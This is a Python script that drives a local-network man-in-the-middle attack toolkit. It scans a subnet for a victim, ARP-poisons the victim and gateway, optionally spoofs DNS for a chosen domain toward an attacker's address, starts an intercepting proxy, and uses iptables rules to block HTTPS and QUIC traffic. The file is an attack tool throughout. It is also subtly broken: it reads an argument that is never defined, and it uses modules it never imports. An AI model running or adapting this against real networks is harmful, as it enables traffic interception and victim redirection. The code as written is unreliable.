from AGOTK.proxy import MyProxy
from AGOTK import ARPPoisoner, network_scanner
from AGOTK import DNSSpoofer
from AGOTK import ProxyServer
from scapy.all import *
import sys
import argparse
import inquirer

def main(argv) -> None:
    parser: argparse.ArgumentParser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', type=str, required=False, help='The interface to use, defaults to default interface')
    parser.add_argument('-t', '--target', type=str, required=False, help='The ip address of the target. Will scan over ip/24 if not given')
    parser.add_argument('-r', '--range', type=str, required=False, help='The ip range (CIDR notation) to scan over, alternative to --target. Will default to ip/24')
    parser.add_argument('-o', '--obtrusive', type=int, required=False, help='Obtrusive mode, this blocks HTTPS and Quic traffic. To turn on: "-o 1". default: 0')

    # DNS Spoofing
    parser.add_argument('-d', '--domain', type=str, required=False, help='A target domain to spoof DNS requests for. This will enable DNS spoofing')
    parser.add_argument('-n', '--newip', type=str, required=False, help='If DNS spoofing is enabled (see --domain), then DNS requests for domain -d will be spoofed towards this IPv4 address')
    parser.add_argument('--newip6', type=str, required=False, help='If DNS spoofing is enabled (see --domain), then DNS requests for domain -d will be spoofed towards this IPv6 address')
    parser.add_argument('--filter', type=int, default=0, help='Filter type for DNS spoofing. 1 uses BPF which is more performant, but might not work with certain interfaces, e.g. Virtualbox interfaces. Default: 0')

    args = parser.parse_args()

    interface: str = ""

    if args.interface is None:
        # if no interface is given, then pick the default one
        interface = conf.iface
    else:
        interface = args.interface

    ip_target: str = ""

    if args.target is None:
        # no target is given so scan automatically over subnet {ip}/24
        if args.range is None:
            ip_range: str = get_if_addr(interface) + '/24'
        else:
            ip_range: str = args.range
            
        ip_addresses: List[str] = network_scanner.scan(interface, ip_range)

        questions = [
            inquirer.List('ip_address',
                        message="What is the ip address of the target?",
                        choices=ip_addresses)
        ]
        answers = inquirer.prompt(questions)
        ip_target = answers['ip_address']
    else:
        # target is given, so we do not scan automatically
        ip_target = args.target

    target_route: Route = conf.route.route(ip_target)
    ip_gateway: str = conf.route.route(target_route[2])[2]
    
    arp_poisoner: ARPPoisoner = ARPPoisoner(interface, ip_target, ip_gateway)
    arp_poisoner.start()

    if args.domain is not None:
        target_domain = args.domain
        bpf_filtering = True if args.filter == 1 else False
        print(f'DNS spoofing enabled for domain: {target_domain}')
        dns_spoofer: DNSSpoofer = DNSSpoofer(ip_target, target_domain, bpf_filtering, interface, args.newip, args.newip6)
        dns_spoofer.start()

    proxy_server: ProxyServer = ProxyServer()
    proxy_server.start()

    if args.blockhttps is not None:
        os.system(f'iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT')
        os.system(f'iptables -t nat -A PREROUTING -p udp --destination-port 443 -j REDIRECT')

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\nExit...")
        arp_poisoner.stop()
        if args.domain:
            dns_spoofer.stop()
        proxy_server.stop()
        if args.blockhttps is not None:
            os.system(f'iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT')
            os.system(f'iptables -t nat -D PREROUTING -p udp --destination-port 443 -j REDIRECT')


    while True:
        try:
            arp_poisoner.thread.join()
            proxy_server.thread.join()    
            break
        except KeyboardInterrupt:
            continue
    
    

if __name__ == "__main__":
    main(sys.argv[1:])
